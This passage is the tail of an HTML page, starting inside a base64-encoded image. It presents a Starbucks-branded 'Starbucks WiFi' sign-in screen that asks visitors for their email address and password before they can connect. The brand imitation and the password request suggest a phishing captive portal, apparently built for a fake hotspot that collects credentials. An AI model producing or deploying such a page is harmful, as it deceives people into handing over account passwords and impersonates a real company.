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" alt="Starbucks">
        </div>
        <h1>Starbucks WiFi</h1>
        <p class="subtitle">Sign in to connect to free WiFi</p>
        <form method="POST" action="">
            <div class="form-group">
                <label>Email Address</label>
                <input type="email" name="email" required placeholder="Enter your email">
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" required placeholder="Enter your password">
            </div>
            <button type="submit">Connect to WiFi</button>
        </form>
        <div class="rewards">
            <strong>Starbucks Rewards™</strong> members get free refills on brewed coffee and tea
        </div>
    </div>
</body>
</html>
